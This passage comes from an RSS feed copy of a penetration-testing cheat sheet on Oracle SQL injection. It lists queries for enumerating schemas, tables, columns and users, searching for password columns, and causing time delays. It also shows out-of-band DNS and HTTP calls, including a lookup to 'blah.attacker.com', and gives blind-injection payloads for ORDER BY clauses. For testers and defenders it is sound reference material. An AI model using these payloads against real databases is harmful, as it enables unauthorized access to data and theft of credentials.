SELECT SYS.DATABASE_NAME FROM DUAL;</td>
</tr>
<tr>
<td>List Databases</td>
<td>SELECT DISTINCT owner FROM all_tables; &#8212; list schemas (one per user)<br />
&#8212; Also query TNS listener for other databases.  See <a href="http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html">tnscmd</a> (services | status).</td>
</tr>
<tr>
<td>List Columns</td>
<td>SELECT column_name FROM all_tab_columns WHERE table_name = &#8216;blah&#8217;;<br />
SELECT column_name FROM all_tab_columns WHERE table_name = &#8216;blah&#8217; and owner = &#8216;foo&#8217;;</td>
</tr>
<tr>
<td>List Tables</td>
<td>SELECT table_name FROM all_tables;<br />
SELECT owner, table_name FROM all_tables;</td>
</tr>
<tr>
<td>Find Tables From Column Name</td>
<td>SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE &#8216;%PASS%&#8217;; &#8212; NB: table names are upper case</td>
</tr>
<tr>
<td>Select Nth Row</td>
<td>SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; &#8212; gets 9th row (rows numbered from 1)</td>
</tr>
<tr>
<td>Select Nth Char</td>
<td>SELECT substr(&#8216;abcd&#8217;, 3, 1) FROM dual; &#8212; gets 3rd character, &#8216;c&#8217;</td>
</tr>
<tr>
<td>Bitwise AND</td>
<td>SELECT bitand(6,2) FROM dual; &#8212; returns 2<br />
SELECT bitand(6,1) FROM dual; &#8212; returns0</td>
</tr>
<tr>
<td>ASCII Value -&gt; Char</td>
<td>SELECT chr(65) FROM dual; &#8212; returns A</td>
</tr>
<tr>
<td>Char -&gt; ASCII Value</td>
<td>SELECT ascii(&#8216;A&#8217;) FROM dual; &#8212; returns 65</td>
</tr>
<tr>
<td>Casting</td>
<td>SELECT CAST(1 AS char) FROM dual;<br />
SELECT CAST(&#8216;1&#8217; AS int) FROM dual;</td>
</tr>
<tr>
<td>String Concatenation</td>
<td>SELECT &#8216;A&#8217; || &#8216;B&#8217; FROM dual; &#8212; returns AB</td>
</tr>
<tr>
<td>If Statement</td>
<td>BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; &#8212; doesn&#8217;t play well with SELECT statements</td>
</tr>
<tr>
<td>Case Statement</td>
<td>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; &#8212; returns 1<br />
SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; &#8212; returns 2</td>
</tr>
<tr>
<td>Avoiding Quotes</td>
<td>SELECT chr(65) || chr(66) FROM dual; &#8212; returns AB</td>
</tr>
<tr>
<td>Time Delay</td>
<td>BEGIN DBMS_LOCK.SLEEP(5); END; &#8212; priv, can&#8217;t seem to embed this in a SELECT<br />
SELECT UTL_INADDR.get_host_name(&#8216;10.0.0.1&#8217;) FROM dual; &#8212; if reverse looks are slow<br />
SELECT UTL_INADDR.get_host_address(&#8216;blah.attacker.com&#8217;) FROM dual; &#8212; if forward lookups are slow<br />
SELECT UTL_HTTP.REQUEST(&#8216;http://google.com&#8217;) FROM dual; &#8212; if outbound TCP is filtered / slow<br />
&#8212; Also see <a href="http://technet.microsoft.com/en-us/library/cc512676.aspx">Heavy Queries</a> to create a time delay</td>
</tr>
<tr>
<td>Make DNS Requests</td>
<td>SELECT UTL_INADDR.get_host_address(&#8216;google.com&#8217;) FROM dual;<br />
SELECT UTL_HTTP.REQUEST(&#8216;http://google.com&#8217;) FROM dual;</td>
</tr>
<tr>
<td>Command Execution</td>
<td><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">Java</a>can be used to execute commands if it&#8217;s installed.<a href="http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql">ExtProc</a> can sometimes be used too, though it normally failed for me. <img src="https://s.w.org/images/core/emoji/13.1.0/72x72/1f641.png" alt="🙁" class="wp-smiley" style="height: 1em; max-height: 1em;" /></td>
</tr>
<tr>
<td>Local File Access</td>
<td><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">UTL_FILE</a> can sometimes be used.  Check that the following is non-null:<br />
SELECT value FROM v$parameter2 WHERE name = &#8216;utl_file_dir&#8217;;<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">Java</a> can be used to read and write files if it&#8217;s installed (it is not available in Oracle Express).</td>
</tr>
<tr>
<td>Hostname, IP Address</td>
<td>SELECT UTL_INADDR.get_host_name FROM dual;<br />
SELECT host_name FROM v$instance;<br />
SELECT UTL_INADDR.get_host_address FROM dual; &#8212; gets IP address<br />
SELECT UTL_INADDR.get_host_name(&#8216;10.0.0.1&#8217;) FROM dual; &#8212; gets hostnames</td>
</tr>
<tr>
<td>Location of DB files</td>
<td>SELECT name FROM V$DATAFILE;</td>
</tr>
<tr>
<td>Default/System Databases</td>
<td>SYSTEM<br />
SYSAUX</td>
</tr>
</tbody>
</table>
<h3>Misc Tips</h3>
<p>In no particular order, here are some suggestions from pentestmonkey readers.</p>
<p>From Christian Mehlmauer:</p>
<table border="1">
<tbody>
<tr>
<td>Get all tablenames in one string</td>
<td>select rtrim(xmlagg(xmlelement(e, table_name || &#8216;,&#8217;)).extract(&#8216;//text()&#8217;).extract(&#8216;//text()&#8217;) ,&#8217;,&#8217;) from all_tables &#8212;  when using union based SQLI with only one row</td>
</tr>
<tr>
<td>Blind SQLI in order by clause</td>
<td>order by case when ((select 1 from user_tables where substr(lower(table_name), 1, 1) = &#8216;a&#8217; and rownum = 1)=1) then column_name1 else column_name2 end &#8212; you must know 2 column names with the same datatype</td>
</tr>
</tbody>
</table>
<h3></h3>
<p>&nbsp;</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
